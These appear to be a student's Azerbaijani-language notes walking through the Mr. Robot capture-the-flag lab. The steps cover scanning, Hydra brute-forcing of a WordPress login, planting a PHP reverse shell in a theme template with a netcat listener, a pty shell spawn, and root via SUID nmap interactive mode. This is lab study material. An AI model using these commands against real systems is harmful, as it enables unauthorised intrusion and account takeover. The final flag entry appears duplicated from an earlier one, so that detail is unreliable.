1)
mr robot import ele
kalini open ele

ikisini de host-only adapter(gostermirse virtualboxu bagla ac)

mr robot ip bax (acilan kimi ekranada gosterur)

kalide:
sudo su
ping at mr robota(mirta)

nmap -p- 192.168.56.101

http ve https portlari aciqdi

kalide browsere gir ve mrrobotun ipsini yaz(192.168.56.101)

sonra 192.168.56.101/robots.txt yaz

User-agent: *
lughet.dic
code-1-of-4.txt

192.168.56.101/lughet.dic ac ve save ele compa lazim olacaq (adini khazar.dic qoydum)

sonra 192.168.56.101/code-1-of-4.txt gir ve kodu gotur

X1: 115b2910f7bc6d5f094c544ea939483e399542c8

nikto -url http://192.168.56.101

bir bir bax readme admin nem ne

http://192.168.56.101/wp-admin

burpsuite ac kalide sonra

proxy->intercept on ele sonra open browser

http://192.168.56.101/wp-login.php yaz sonra forward ele sayt acilsin

sonra login testuser 
pass: testpassword yaz
submit ele
forwar ele
burpsuitede post requesti copy paste ele txt faylina:

POST /wp-login.php HTTP/1.1
Host: 192.168.56.101
Content-Length: 113
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.56.101
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.101/wp-login.php
Accept-Encoding: gzip, deflate, br
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: keep-alive

log=testuser&pwd=testpassword&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.101%2Fwp-admin%2F&testcookie=1

submit edenden sonra invalid username kimi sey cixir onu copy paste ele txt faylina(hydrada yazacaqsan asagidaki kimi)

terminalda:

cd Downloads

cat khazar.dic | sort | uniq > siyahi.txt

hydra --help

error texti burda yaz(inspectle baxsan yaxsi olar)(koda kopyala):

bunu yaziriq ki useri tapsin:

hydra -L siyahi.txt -p testparol 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:Invalid username.'

login poppetg imis

X2: poppetg

indi poppetg yazib testparol yazib erroru yeniden copy paste edeceyik asagidaki koda(kodlar da eyni fayldadi siyahi.txt)

hydra -l poppetg -P siyahi.txt 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:The password you entered for the username.'

password: 05800580

X3: 05800580

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

sonra admin panelde:
appearance -> editor -> 404 errorun kodunu githubdakini yaz

sonra $ip olan yere kalinin ip yaz(ip a)
portu random yaz 8081 yazmisdi muellim

sonra terminala kec:

nc -nvlp 8081

sonra kec random url yaz: http://192.168.56.101/sdjsahjd

sonra qayit terminala:

ls yaz goreceksen server elindedi
enter enter bas
sonra:
find / -type f -name "*code-2-of-4.txt" 2>/dev/null

copy pasteni sag clickle ele

cat /opt/bitnami/apps/wordpress/htdocs/xikaxecclv6blevbuojtfdxy7t3z3qpa8wze3xzg-ServerS50-code-2-of-4.txt

faylin adinaki kodda lazim olavaq deyesen(X4)

X5: 69bfd5d64e5b9ce3f148fe4d501911f9cf7d689e


Novbeti merhelede robot userinin passwordunu isteyir

cd home/robot/

cat password.raw-base64 | base64 -d

X6: crusher

Novbeti merhelede robot userine girib password tapmaq lazimdi amma evvelce "spawning a shell" metodu lazimdi:

python -c 'import pty; pty.spawn("/bin/sh")'

su robot
passwordu yaz: crusher

ls

cat code-3-of-4.txt
X7: e29d385f947b97956dffb89fd16888cac4e1d086

sonuncu merhelede root userine girmeliyik(privelege escelation lazimdi

cat /etc/passwd

find / -perm -4000 -type f 2>/dev/null

goreceksen ki nmap var

sonra nmapin super user olmasi ucun saytda commandlara baxacaqsan

https://gtfobins.github.io/gtfobins/nmap/

sonra: 
/usr/local/bin/nmap --interactive

!sh

sonra emin olmaq ucun id ve ya whoami
ls
cat code-3-of-4.txt

X8: e29d385f947b97956dffb89fd16888cac4e1d086






